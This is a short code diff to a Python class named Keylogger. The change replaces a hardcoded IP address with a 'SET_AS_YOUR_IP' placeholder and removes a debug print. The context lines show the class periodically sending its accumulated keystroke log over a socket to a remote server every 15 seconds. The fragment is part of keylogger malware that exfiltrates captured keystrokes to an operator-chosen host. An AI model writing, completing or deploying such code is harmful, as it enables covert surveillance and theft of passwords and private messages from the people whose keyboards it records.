@@ -10,7 +10,7 @@ class Keylogger:
         self.log = ""
         TIME_INTERVAL = 15
         self.interval = TIME_INTERVAL
-        serverHost = "192.168.68.114"
+        serverHost = "SET_AS_YOUR_IP"
         # serverHost = "127.0.0.1"
         serverPort = 2000
         serverAddress = (serverHost, serverPort)
@@ -68,7 +68,6 @@ class Keylogger:
         self.clientSocket.sendall(packet)
 
     def report(self):
-        # print(f"log is {self.log}")
         self.send_socket()
         self.log = ""
         timer = Timer(interval = self.interval, function = self.report)
